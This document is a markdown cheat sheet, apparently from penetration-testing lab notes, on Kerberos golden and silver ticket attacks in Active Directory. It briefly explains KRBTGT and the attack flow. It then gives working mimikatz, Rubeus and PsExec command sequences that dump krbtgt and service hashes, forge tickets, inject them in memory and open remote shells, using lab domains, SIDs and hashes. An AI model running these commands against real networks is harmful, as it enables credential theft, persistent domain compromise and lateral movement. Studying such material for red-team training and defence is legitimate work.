# Golden/Silver Ticket Attacks

- [Golden/Silver Ticket Attacks](#goldensilver-ticket-attacks)
  - [Overview](#overview)
  - [KRBTGT Overview](#krbtgt-overview)
  - [Attack Overview](#attack-overview)
    - [Golden Tickets](#golden-tickets)
    - [Silver Tickets](#silver-tickets)

## Overview

- Silver ticket is more stealthy than golden ticket
- Silver ticket is limited to the target service
- Golden ticket has access to any Kerberos service
- Scenario for silver ticket:
  - Want to access the domain's SQL server
  - How ever current user does not have access
  - Find accessible service account to get a foothold with kerberoasting that service
  - Dump service hash
  - Impersonate their TGT in order to request a service ticket for the SQL service from the KDC to gain access to SQL service

## KRBTGT Overview

- KRBTGT is service account for the KDC
- If you impersonate this account to create golden ticket from the KRBTGT you can get the ability to create a service ticket for anything you want
- TGT is a ticket to a service account issued by the KDC and can only access that service

## Attack Overview

- Dump TGT of any user on the domain, perferably a domain admin
- For golden ticket dump krbtgt ticket
- For silver ticket dump any service or domain admin ticket
- This will provide you with the service/domain admin account's SID as well as the NTLM hash
- Use those details with mimikatz to create golden/silver ticket

### Golden Tickets

```powershell
# Load mimikatz and get SYSTEM
mimikatz.exe
privilege::debug
token::elevate

# Dump hash and SID for ticket
# Replace krbtgt with any other DA/service name for silver ticket attack
lsadump::lsa /inject /name:krbtgt

# Create golden ticket
# Set user and id for user you want to impersonate
# Set sid of the domain (get with `whoami /user`)
kerberos::golden /sid:<sid> /domain:controller.local /id:<id> /user:<user> /krbtgt:<NTLM> 

# Open elevated command prompt with the given ticket
misc::cmd

mimikatz "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"

# Inject in memory
.\Rubeus.exe ptt /ticket:ticket.kirbi

# List tickets in memory
klist

# Obtain a shell
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```

### Silver Tickets

- /domain: The FDQN
- /sid: The SID (Security Identifier) of the Domain (whoami /user)
- /user: Target Account/Computer to Impersonate
- /id: RID of the account you will be impersonating
- /ptt: Optional (Will Inject Ticket or you can do with Rubeus)
- /rc4: NTLM Hash of User Password/Computer Password

```powershell
# Dump hash and SID for ticket
mimikatz.exe "lsadump::lsa /inject /name:service"

# Create the ticket
mimikatz.exe "kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park"

# Open elevated command prompt with the given ticket
mimikatz "misc::cmd"

# Inject in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt ticket.kirbi"
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Obtain a shell
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
